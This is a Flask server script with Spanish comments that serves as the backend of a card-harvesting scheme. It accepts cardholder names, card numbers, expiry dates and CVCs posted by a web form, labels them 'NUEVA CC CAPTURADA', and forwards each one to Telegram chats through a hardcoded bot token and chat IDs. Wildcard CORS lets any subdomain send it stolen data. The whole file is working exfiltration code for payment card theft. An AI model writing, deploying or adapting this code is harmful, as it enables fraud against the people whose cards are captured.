import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)

# --- CONFIGURACIÓN DE SEGURIDAD CORS ---
# Esto permite que CUALQUIER subdominio (free, cliente1, etc.) 
# le mande datos al servidor sin que el navegador los bloquee.
CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)

# --- CONFIGURACIÓN DE TELEGRAM ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

# --- DIVISIÓN DE DESTINATARIOS (TU LISTA MAESTRA) ---
# Aquí controlas quién recibe qué. El servidor solo aceptará IDs que estén aquí.
CLIENTES_PRIVADOS = ['6953415010', '7707049896'] 
GRUPOS_DESTINO = ['-1087968824', '1087968824']

# Combinamos ambos para la validación de seguridad
LISTA_MAESTRA_STRINGS = [str(i).strip() for i in (CLIENTES_PRIVADOS + GRUPOS_DESTINO)]

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    # 1. Captura de datos del JSON
    data = request.json
    # El HTML manda la lista de IDs que el cliente quiere que reciban la CC
    lista_ids_html = data.get('lista_ids', [])
    
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    # 2. Construcción del mensaje
    mensaje = (
        f"💰 *NUEVA CC CAPTURADA* 💰\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

    exitos = 0
    
    # 3. Procesamiento de la lista de IDs enviada por el HTML
    for id_receptor in lista_ids_html:
        # Limpiamos el ID que viene del HTML para que la comparación sea perfecta
        id_limpio = str(id_receptor).strip()

        # VALIDACIÓN DE SEGURIDAD: ¿El ID está en nuestra lista maestra?
        if id_limpio in LISTA_MAESTRA_STRINGS:
            
            # 4. ENVÍO A TELEGRAM
            url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                "chat_id": id_limpio, 
                "text": mensaje, 
                "parse_mode": "Markdown"
            }
            
            try:
                res = requests.post(url_telegram, json=payload, timeout=5)
                if res.status_code == 200:
                    exitos += 1
                    print(f"✅ ENVIADO EXITOSO AL ID: {id_limpio}")
                else:
                    print(f"❌ ERROR DE TELEGRAM PARA {id_limpio}: {res.text}")
            except Exception as e:
                print(f"❌ ERROR DE RED CON {id_limpio}: {e}")
        else:
            # Si el ID no está en la lista maestra, el servidor lo ignora
            print(f"🚫 ID RECHAZADO (No autorizado): {id_limpio}")

    print(f"🏁 PROCESO TERMINADO. Enviados con éxito: {exitos}")
    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    # Ejecución en el puerto que asigne Railway
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
